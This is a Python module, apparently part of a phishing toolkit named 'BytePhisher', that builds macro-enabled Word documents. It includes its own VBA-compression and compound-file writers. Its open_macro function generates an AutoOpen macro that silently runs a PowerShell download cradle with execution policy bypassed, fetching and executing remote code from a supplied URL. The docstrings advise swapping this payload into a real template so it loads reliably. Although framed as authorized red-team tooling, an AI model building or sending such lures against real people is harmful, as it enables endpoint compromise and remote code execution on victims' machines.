"""Macro-enabled Word documents (.docm) and the VBA project they carry, stdlib only.

This module builds a ``.docm`` from scratch: the OOXML package (zip) plus a synthetic
``word/vbaProject.bin`` compound file that holds a VBA module. It is meant for
authorized red-team / security-awareness work where a macro lure is in scope.

What is emitted and what is left out (read this before trusting the bytes)
--------------------------------------------------------------------------
Inside ``vbaProject.bin`` (a CFB, MS-CFB) we emit exactly the streams a macro container
needs to be *parsed*:

* ``PROJECT``  - the project text stream (module list, name, version strings).
* ``PROJECTwm`` - the workspace stream (a stub).
* ``VBA/dir``  - the compressed "dir" stream (MS-OVBA) with one MODULE record.
* ``VBA/_VBA_PROJECT`` - a stub. Real projects store a version record here; we emit the
  4-byte MS-OVBA reserved marker only. ``olevba`` only checks that the stream exists.
* ``VBA/<module>`` - the module stream: a 4-byte reserved prefix, then the
  MS-OVBA-compressed source.

We do NOT emit a PerformanceCache (p-code) inside the module stream, the
``PROJECTLINK`` / reference records, nor a byte-accurate ``_VBA_PROJECT`` version
record. We also do not reproduce the exact ``Reserved`` header value that Word writes
at the start of a module stream.

Verification status
-------------------
* The MS-OVBA compressor/decompressor and the CFB writer ARE verified against an
  independent parser: ``oletools`` (``olefile`` + ``olevba``) reads the generated
  container and extracts the module source byte for byte. That is what
  ``tests/test_vba.py`` asserts when ``oletools`` is installed; if it is not, the test
  SKIPS with that reason instead of asserting our own output back at us.
* Word/Office loading the document and RUNNING the macro is NOT verified here. A macro
  document only does anything if the recipient opens it with macros ENABLED; that is a
  Trust Center / policy decision, frequently blocked by default and by Protected View.
  A synthetic project with no p-code cache may also be rejected by Office on load.
* Nothing in this module bypasses MFA. An auto-open macro runs code on the endpoint; it
  does not touch authentication.

A synthetic ``.docm`` is a weaker bet in a real engagement than injecting the module
into the operator's OWN working macro template, which already carries a valid
``_VBA_PROJECT``, p-code cache and host wiring. That is why ``docm(..., template=...)``
exists: it copies a real ``.docm`` and swaps only its ``word/vbaProject.bin``.

Pure standard library. Imports cleanly on Windows. ASCII only (the emitted VBA text
too).
"""
import io
import os
import re
import struct
import zipfile

__all__ = ["ovba_compress", "ovba_decompress", "cfb", "vba_project", "docm",
           "open_macro"]

# ---------------------------------------------------------------------------
# MS-OVBA 2.4.1 : the compressed container used by VBA "dir" and module streams.
# ---------------------------------------------------------------------------

_OVBA_SIGNATURE = 0x01
_CHUNK_MAX_RAW = 4096          # a chunk decompresses to at most 4096 bytes
_CHUNK_MAX_ENCODED = 4096      # the 12-bit size field caps the encoded chunk at 4096


def _ovba_bit_count(decompressed_in_chunk):
    """Bits reserved for the CopyToken offset (MS-OVBA 2.4.1.3.19.1 CopyTokenHelp).

    ``bit_count = max(ceil(log2(difference)), 4)`` where ``difference`` is the number
    of bytes already produced in the current chunk. Integer math (``(n-1).bit_length()``)
    is used so it agrees with the reference implementation across power-of-two
    boundaries, where a floating ``log`` can round the wrong way.
    """
    if decompressed_in_chunk <= 0:
        return 4
    return max((decompressed_in_chunk - 1).bit_length(), 4)


def _ovba_encode_chunk(raw):
    """Encode one raw chunk (<= 4096 bytes) into flag bytes + literal/copy tokens.

    A greedy first-match encoder: at each position it looks back (bounded by the
    CopyToken offset width) for the longest match of length >= 3 and emits a copy
    token, otherwise a literal. Correctness over ratio - the output is validated by
    round-trip and by ``oletools`` decompressing it.
    """
    tokens = []                # ("L", byte) or ("C", offset, length)
    i, n = 0, len(raw)
    while i < n:
        best_len, best_off = 0, 0
        if i > 0:
            bit_count = _ovba_bit_count(i)
            max_len = (0xFFFF >> bit_count) + 3         # length field + 3
            max_off = 1 << bit_count                     # offset field + 1
            limit = min(max_len, n - i)
            lo = max(0, i - max_off)
            for j in range(lo, i):
                length = 0
                while length < limit and raw[i + length] == raw[j + length]:
                    length += 1
                if length > best_len:
                    best_len, best_off = length, i - j
                    if best_len == limit:
                        break
        if best_len >= 3:
            tokens.append(("C", best_off, best_len))
            i += best_len
        else:
            tokens.append(("L", raw[i]))
            i += 1

    # Packing: bit_count depends on how many bytes have been produced so far in the
    # chunk, so the flag bytes and tokens are laid out in one position-aware pass -
    # the encoder must use the exact bit_count the decoder will recompute.
    out = bytearray()
    produced = 0
    for group in range(0, len(tokens), 8):
        flag = 0
        body = bytearray()
        for k, tok in enumerate(tokens[group:group + 8]):
            if tok[0] == "L":
                body.append(tok[1])
                produced += 1
            else:
                flag |= (1 << k)
                _t, offset, length = tok
                bit_count = _ovba_bit_count(produced)
                token = (((offset - 1) << (16 - bit_count)) | (length - 3)) & 0xFFFF
                body.append(token & 0xFF)
                body.append((token >> 8) & 0xFF)
                produced += length
        out.append(flag)
        out += body
    return bytes(out)


def ovba_compress(data):
    """Compress ``data`` into an MS-OVBA compressed container (signature byte 0x01).

    The container is the signature followed by one or more compressed chunks. Each
    chunk carries a 2-byte header: 12 bits of size, the 3-bit value ``0b011`` and the
    compressed-chunk flag. A chunk whose encoded form would exceed the 4096-byte field
    is split (only full 4096-byte incompressible chunks can hit this), so the size field
    is always representable. Empty input yields the bare signature byte.
    """
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes")
    data = bytes(data)
    out = bytearray([_OVBA_SIGNATURE])
    pos = 0
    while pos < len(data):
        n = min(_CHUNK_MAX_RAW, len(data) - pos)
        while True:
            encoded = _ovba_encode_chunk(data[pos:pos + n])
            if len(encoded) <= _CHUNK_MAX_ENCODED or n == 1:
                break
            n //= 2
        # header: (encoded length - 1) | 0b011 << 12 | compressed flag
        header = (len(encoded) - 1) | (0b011 << 12) | (1 << 15)
        out += struct.pack("<H", header)
        out += encoded
        pos += n
    return bytes(out)


def ovba_decompress(data):
    """Decompress an MS-OVBA compressed container back to bytes.

    This is the spec-defined direction. Raises ``ValueError`` on a missing/short
    signature, a bad chunk signature, or a copy token that references before the start
    of the decompressed buffer.
    """
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes")
    data = bytes(data)
    if not data:
        raise ValueError("empty MS-OVBA container")
    if data[0] != _OVBA_SIGNATURE:
        raise ValueError(f"bad MS-OVBA signature byte 0x{data[0]:02X}")
    out = bytearray()
    pos = 1
    end = len(data)
    while pos < end:
        if pos + 2 > end:
            raise ValueError("truncated MS-OVBA chunk header")
        header = data[pos] | (data[pos + 1] << 8)
        pos += 2
        if ((header >> 12) & 0b111) != 0b011:
            raise ValueError("bad MS-OVBA chunk signature")
        total = (header & 0x0FFF) + 3          # total chunk size including its header
        chunk_flag = (header >> 15) & 1
        chunk_end = pos + (total - 2)
        if chunk_end > end:
            raise ValueError("MS-OVBA chunk runs past the end of the container")
        if chunk_flag == 0:
            # RawChunk: the bytes are stored verbatim.
            out += data[pos:chunk_end]
            pos = chunk_end
            continue
        chunk_start = len(out)
        while pos < chunk_end:
            flag = data[pos]
            pos += 1
            for bit in range(8):
                if pos >= chunk_end:
                    break
                if not (flag >> bit) & 1:
                    out.append(data[pos])
                    pos += 1
                    continue
                token = data[pos] | (data[pos + 1] << 8)
                pos += 2
                difference = len(out) - chunk_start
                bit_count = _ovba_bit_count(difference)
                length = (token & (0xFFFF >> bit_count)) + 3
                offset = (token >> (16 - bit_count)) + 1
                source = len(out) - offset
                if source < chunk_start:
                    raise ValueError("MS-OVBA copy token references before the chunk")
                for k in range(length):
                    out.append(out[source + k])
    return bytes(out)


# ---------------------------------------------------------------------------
# MS-CFB : a minimal Compound File Binary writer (512-byte sectors).
# ---------------------------------------------------------------------------

_CFB_SIGNATURE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
_SECTOR = 512
_MINI_SECTOR = 64
_MINI_CUTOFF = 4096
_ENDOFCHAIN = 0xFFFFFFFE
_FREESECT = 0xFFFFFFFF
_FATSECT = 0xFFFFFFFD
_NOSTREAM = 0xFFFFFFFF


def _flatten_tree(root):
    """Turn ``{name: bytes|dict}`` into an ordered list of CFB directory entries.

    Children of every storage are linked as a sorted right-chain (order = name length,
    then uppercase name), which is a valid red-black tree layout for a binary search and
    is what ``olefile`` walks when it rebuilds the tree.
    """
    entries = [{"name": "Root Entry", "typ": 5, "child": _NOSTREAM, "left": _NOSTREAM,
                "right": _NOSTREAM, "start": _ENDOFCHAIN, "size": 0, "data": None}]

    def link(parent_index, node):
        names = sorted(node.keys(), key=lambda s: (len(s), s.upper()))
        indices = []
        for name in names:
            value = node[name]
            index = len(entries)
            if isinstance(value, (bytes, bytearray)):
                data = bytes(value)
                entries.append({"name": name, "typ": 2, "child": _NOSTREAM,
                                "left": _NOSTREAM, "right": _NOSTREAM,
                                "start": _ENDOFCHAIN, "size": len(data), "data": data})
            else:
                entries.append({"name": name, "typ": 1, "child": _NOSTREAM,
                                "left": _NOSTREAM, "right": _NOSTREAM,
                                "start": _ENDOFCHAIN, "size": 0, "data": None})
                link(index, value)
            indices.append(index)
        for left, right in zip(indices, indices[1:], strict=False):
            entries[left]["right"] = right
        entries[parent_index]["child"] = indices[0] if indices else _NOSTREAM

    link(0, root)
    return entries


def _serialize_dir_entry(entry):
    raw = entry["name"].encode("utf-16-le") + b"\x00\x00"
    name_length = len(raw)                       # includes the null terminator
    name_field = raw.ljust(64, b"\x00")[:64]
    size = entry["size"]
    head = name_field + struct.pack("<HBB", name_length, entry["typ"], 1)  # 1 = black
    links = struct.pack("<III", entry["left"], entry["right"], entry["child"])
    tail = (b"\x00" * 16                       # CLSID
            + struct.pack("<I", 0)             # state bits
            + b"\x00" * 16                     # creation / modified time
            + struct.pack("<I", entry["start"] & 0xFFFFFFFF)
            + struct.pack("<II", size & 0xFFFFFFFF, 0))                    # size (64-bit)
    return head + links + tail


def cfb(storages):
    """Build a compound file (MS-CFB) as bytes from a nested ``dict``.

    ``storages`` maps names to either ``bytes`` (a stream) or another ``dict`` (a
    storage), recursing. Streams below 4096 bytes go in the mini stream, larger ones in
    the FAT. The result is a 512-byte-sector file: the header, the FAT, the directory
    chain and, when needed, the mini FAT and mini stream.
    """
    entries = _flatten_tree(storages)

    # Mini stream: pack every small stream into 64-byte mini sectors.
    mini = bytearray()
    mini_fat = []
    for entry in entries:
        if entry["typ"] != 2 or entry["size"] == 0 or entry["size"] >= _MINI_CUTOFF:
            continue
        count = (entry["size"] + _MINI_SECTOR - 1) // _MINI_SECTOR
        entry["start"] = len(mini_fat)
        for k in range(count):
            mini += entry["data"][k * _MINI_SECTOR:(k + 1) * _MINI_SECTOR].ljust(
                _MINI_SECTOR, b"\x00")
            mini_fat.append(entry["start"] + k + 1 if k < count - 1 else _ENDOFCHAIN)

    sectors = []          # the raw 512-byte sectors, in file order
    fat = []              # one FAT entry per sector, same order

    def alloc_regular(data):
        start = len(sectors)
        count = max(1, (len(data) + _SECTOR - 1) // _SECTOR)
        for k in range(count):
            sectors.append(data[k * _SECTOR:(k + 1) * _SECTOR].ljust(_SECTOR, b"\x00"))
            fat.append(start + k + 1 if k < count - 1 else _ENDOFCHAIN)
        return start

    # 1. the mini stream itself lives in the FAT; the root entry points at it.
    if mini:
        entries[0]["start"] = alloc_regular(bytes(mini))
        entries[0]["size"] = len(mini)

    # 2. streams large enough to skip the mini stream.
    for entry in entries:
        if entry["typ"] == 2 and entry["size"] >= _MINI_CUTOFF:
            entry["start"] = alloc_regular(entry["data"])

    # 3. directory chain (padded to whole sectors - 4 entries per sector).
    directory = bytearray()
    for entry in entries:
        directory += _serialize_dir_entry(entry)
    while len(directory) % _SECTOR:
        directory += b"\x00" * 128
    if not directory:
        directory += b"\x00" * _SECTOR
    first_dir = alloc_regular(bytes(directory))

    # 4. mini FAT chain.
    if mini_fat:
        blob = b"".join(struct.pack("<I", v) for v in mini_fat)
        first_minifat = alloc_regular(blob)
        num_minifat = len(sectors) - first_minifat
    else:
        first_minifat = _ENDOFCHAIN
        num_minifat = 0

    # 5. FAT sectors. Solve for F so 128 entries per sector covers all sectors
    #    (streams + directory + mini FAT + the FAT sectors themselves).
    already = len(sectors)
    num_fat = 1
    while 128 * num_fat < already + num_fat:
        num_fat += 1
    if num_fat > 109:
        # More FAT sectors than the header DIFAT can name: a DIFAT would be required,
        # which this minimal writer does not implement.
        raise ValueError("payload too large for this minimal CFB writer (needs DIFAT)")
    fat += [_FATSECT] * num_fat
    fat += [_FREESECT] * (128 * num_fat - len(fat))
    fat_blob = b"".join(struct.pack("<I", v) for v in fat)
    for k in range(num_fat):
        sectors.append(fat_blob[k * _SECTOR:(k + 1) * _SECTOR])
    first_fat = already

    difat = [first_fat + k for k in range(num_fat)]
    difat += [_FREESECT] * (109 - len(difat))

    header = bytearray()
    header += _CFB_SIGNATURE
    header += b"\x00" * 16                                  # CLSID
    header += struct.pack("<HHH", 0x003E, 0x0003, 0xFFFE)  # minor, major=3, byte order
    header += struct.pack("<H", 9)                          # sector shift (512)
    header += struct.pack("<H", 6)                          # mini sector shift (64)
    header += b"\x00" * 6                                   # reserved
    header += struct.pack("<I", 0)                          # number of directory sectors
    header += struct.pack("<I", num_fat)
    header += struct.pack("<I", first_dir)
    header += struct.pack("<I", 0)                          # transaction signature
    header += struct.pack("<I", _MINI_CUTOFF)
    header += struct.pack("<I", first_minifat)
    header += struct.pack("<I", num_minifat)
    header += struct.pack("<I", _ENDOFCHAIN)                # first DIFAT sector
    header += struct.pack("<I", 0)                          # number of DIFAT sectors
    header += b"".join(struct.pack("<I", v) for v in difat)
    header = header.ljust(_SECTOR, b"\x00")

    return bytes(header) + b"".join(sectors)


# ---------------------------------------------------------------------------
# The VBA project: dir stream + module stream + CFB container.
# ---------------------------------------------------------------------------

_CODE_PAGE = 1252                       # the codepage the project text is written in
_MODULE_PREFIX = b"\x00\x00\x00\x00"    # Reserved header of a module stream

# A module or project name reaches the macro source, the dir/project streams and the
# wne:macroName attribute. Each of those is a different grammar, so a name is required to
# be an identifier rather than escaped for all three.
_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,80}$")
# Characters that break out of the macro text a URL is placed into.
_BAD_URL_CHARS = re.compile("[\\s'\"`<>\\\\]")


def _check_module_name(value, what="module name"):
    """An identifier, or a ValueError naming what was wrong."""
    if not _NAME_RE.match(str(value or "")):
        raise ValueError(f"{what} must be an identifier (letters, digits, underscore): "
                         f"{value!r}")
    return str(value)


def _check_url(url):
    """A URL that can sit inside the generated macro text without breaking out of it."""
    text = str(url or "").strip()
    if not text:
        raise ValueError("a macro stager needs a non-empty url")
    if _BAD_URL_CHARS.search(text):
        raise ValueError("url contains a character that would break the generated macro: "
                         f"{url!r}")
    return text


def _dir_stream(project_name, module, text_offset):
    """The uncompressed MS-OVBA "dir" stream (MS-OVBA 2.3.4.2) for one procedural module.

    Every record olevba walks is present in order; the optional MODULENAMEUNICODE,
    MODULEDOCSTRING, MODULEREADONLY and MODULEPRIVATE records are omitted, which the
    records' ordering rule allows.
    """
    out = bytearray()

    def record(record_id, payload):
        out.extend(struct.pack("<H", record_id))
        out.extend(struct.pack("<I", len(payload)))
        out.extend(payload)

    out += struct.pack("<HI", 0x0001, 4) + struct.pack("<L", 0x00000001)   # PROJECTSYSKIND
    out += struct.pack("<HI", 0x0002, 4) + struct.pack("<L", 0x00000409)   # PROJECTLCID
    out += struct.pack("<HI", 0x0014, 4) + struct.pack("<L", 0x00000409)   # PROJECTLCIDINVOKE
    out += struct.pack("<HI", 0x0003, 2) + struct.pack("<H", _CODE_PAGE)   # PROJECTCODEPAGE
    record(0x0004, project_name.encode("cp1252"))                          # PROJECTNAME
    # PROJECTDOCSTRING (empty ASCII + empty unicode, reserved marker 0x0040)
    out += struct.pack("<HI", 0x0005, 0) + struct.pack("<H", 0x0040) + struct.pack("<I", 0)
    # PROJECTHELPFILEPATH (empty, reserved marker 0x003D)
    out += struct.pack("<HI", 0x0006, 0) + struct.pack("<H", 0x003D) + struct.pack("<I", 0)
    out += struct.pack("<HI", 0x0007, 4) + struct.pack("<L", 0)            # PROJECTHELPCONTEXT
    out += struct.pack("<HI", 0x0008, 4) + struct.pack("<L", 0)            # PROJECTLIBFLAGS
    out += struct.pack("<HI", 0x0009, 4) + struct.pack("<L", 0) + struct.pack("<H", 0)  # VERSION
    # PROJECTCONSTANTS (empty, reserved marker 0x003C)
    out += struct.pack("<HI", 0x000C, 0) + struct.pack("<H", 0x003C) + struct.pack("<I", 0)
    # no REFERENCE records
    out += struct.pack("<HI", 0x000F, 2) + struct.pack("<H", 1)            # PROJECTMODULES
    out += struct.pack("<HI", 0x0013, 2) + struct.pack("<H", 0xFFFF)       # ProjectCookieRecord

    name = module.encode("cp1252")
    record(0x0019, name)                                                   # MODULENAME
    out += struct.pack("<HI", 0x001A, len(name)) + name                    # MODULESTREAMNAME
    out += struct.pack("<H", 0x0032)
    out += struct.pack("<I", len(name) * 2) + module.encode("utf-16-le")
    out += struct.pack("<HI", 0x0031, 4) + struct.pack("<L", text_offset)  # MODULEOFFSET
    out += struct.pack("<HI", 0x001E, 4) + struct.pack("<L", 0)            # MODULEHELPCONTEXT
    out += struct.pack("<HI", 0x002C, 2) + struct.pack("<H", 0xFFFF)       # MODULECOOKIE
    out += struct.pack("<H", 0x0021) + struct.pack("<I", 0)                # MODULETYPE (proc)
    out += struct.pack("<H", 0x002B) + struct.pack("<I", 0)                # TERMINATOR
    return bytes(out)


def _project_stream(module, project_name):
    lines = [
        'ID="{00000000-0000-0000-0000-000000000000}"',
        "Module=" + module,
        'Name="' + project_name + '"',
        'HelpContextID="0"',
        'VersionCompatible32="393222000"',
        'CMG=""',
        'DPB=""',
        'GC=""',
        "[Host Extender Info]",
        "[Workspace]",
        module + "=-1, 0, 0, 0, Z",
    ]
    return ("\r\n".join(lines) + "\r\n").encode("cp1252")


def vba_project(source, *, module="Module1", project_name="Project"):
    """Assemble a ``vbaProject.bin`` compound file carrying ``source`` as one module.

    Emits the ``PROJECT`` / ``PROJECTwm`` streams, the ``VBA`` storage with its ``dir``
    and ``_VBA_PROJECT`` streams and the module stream; see the module docstring for
    what is deliberately omitted. Raises ``ValueError`` for an empty source.
    """
    if not source:
        raise ValueError("macro source must not be empty")
    module = _check_module_name(module)
    project_name = _check_module_name(project_name, "project name")
    source_bytes = source.encode("cp1252")
    module_stream = _MODULE_PREFIX + ovba_compress(source_bytes)
    dir_bytes = _dir_stream(project_name, module, len(_MODULE_PREFIX))
    tree = {
        "PROJECT": _project_stream(module, project_name),
        "PROJECTwm": b"[Workspace]\r\n",
        "VBA": {
            "dir": ovba_compress(dir_bytes),
            "_VBA_PROJECT": b"\xcc\x61\x00\x00",     # stub: reserved marker only
            module: module_stream,
        },
    }
    return cfb(tree)


# ---------------------------------------------------------------------------
# The OOXML .docm package.
# ---------------------------------------------------------------------------

_CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" '
    'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
    '<Override PartName="/word/vbaProject.bin" '
    'ContentType="application/vnd.ms-office.vbaProject"/>'
    '<Override PartName="/word/vbaData.xml" '
    'ContentType="application/vnd.ms-word.vbaData+xml"/>'
    '<Override PartName="/word/settings.xml" ContentType="application/vnd.'
    'openxmlformats-officedocument.wordprocessingml.settings+xml"/>'
    "</Types>"
)

_ROOT_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/officeDocument" Target="word/document.xml"/>'
    "</Relationships>"
)

_DOCUMENT_RELS = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/vbaProject" Target="vbaProject.bin"/>'
    '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/'
    '2006/relationships/settings" Target="settings.xml"/>'
    "</Relationships>"
)

_DOCUMENT_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    "<w:body><w:p><w:r><w:t>This document is macro-enabled.</w:t></w:r></w:p>"
    "<w:sectPr/></w:body></w:document>"
)

_SETTINGS_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
    '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:zoom w:percent="100"/></w:settings>'
)


def _vba_data_xml(module):
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
        '<wne:vbaSuppData '
        'xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml">'
        "<wne:mcds><wne:mcd "
        f'wne:macroName="{module}.AutoOpen" wne:name="{module}.AutoOpen" '
        'wne:menuName="Macro" wne:default="1"/></wne:mcds></wne:vbaSuppData>'
    )


def docm(source, *, module="Module1", template=None):
    """Build a macro-enabled Word document (``.docm``) as bytes.

    Without ``template`` the package is written from scratch: the content-types,
    relationships, ``word/document.xml``, ``word/settings.xml``, ``word/vbaData.xml``
    and the ``word/vbaProject.bin`` built by :func:`vba_project`.

    With ``template`` set to the path of an existing ``.docm``, a copy is produced and
    only its ``word/vbaProject.bin`` is replaced. That is the reliable path for a real
    engagement: the template already carries a valid ``_VBA_PROJECT``, host wiring and
    (typically) an existing project, so the swap inherits everything Word needs that a
    synthetic project lacks. The template must already be macro-enabled.

    Raises ``ValueError`` for an empty source. Building from scratch does not run in
    Word and is only parse-verified; see the module docstring.
    """
    if not source:
        raise ValueError("macro source must not be empty")
    container = vba_project(source, module=module)

    if template is not None:
        if not os.path.isfile(template):
            raise FileNotFoundError(f"template .docm not found: {template}")
        out = io.BytesIO()
        replaced = False
        with zipfile.ZipFile(template, "r") as src, \
                zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
            for info in src.infolist():
                if info.filename == "word/vbaProject.bin":
                    dst.writestr(info, container)
                    replaced = True
                else:
                    dst.writestr(info, src.read(info.filename))
            if not replaced:
                dst.writestr("word/vbaProject.bin", container)
        return out.getvalue()

    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", _CONTENT_TYPES)
        z.writestr("_rels/.rels", _ROOT_RELS)
        z.writestr("word/document.xml", _DOCUMENT_XML)
        z.writestr("word/_rels/document.xml.rels", _DOCUMENT_RELS)
        z.writestr("word/settings.xml", _SETTINGS_XML)
        z.writestr("word/vbaProject.bin", container)
        z.writestr("word/vbaData.xml", _vba_data_xml(module))
    return out.getvalue()


def open_macro(url, *, module="AutoOpen"):
    """VBA source (text) that runs a PowerShell command when the document is opened.

    ``module`` is the auto-open entry point name (``AutoOpen`` for Word, or
    ``Document_Open``). The returned text is pure ASCII and is meant to be passed as the
    ``source`` argument of :func:`vba_project` or :func:`docm`.

    This is a download stager, not an exploit: it only runs if the recipient opens the
    document with macros enabled, and it does not bypass MFA.
    """
    module = _check_module_name(module)
    url = _check_url(url)
    command = ("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden "
               "-Command \"IEX (New-Object Net.WebClient).DownloadString('" + url + "')\"")
    quoted = command.replace('"', '""')
    lines = [
        "' BytePhisher auto-open stager. Runs a PowerShell download cradle on open.",
        "' Requires the document to be opened with macros ENABLED; it does not bypass",
        "' Protected View, the Trust Center macro block, or MFA.",
        "",
        "Sub " + module + "()",
        "    Dim bp_cmd As String",
        '    bp_cmd = "' + quoted + '"',
        '    CreateObject("WScript.Shell").Run bp_cmd, 0, False',
        "End Sub",
        "",
    ]
    return "\r\n".join(lines)
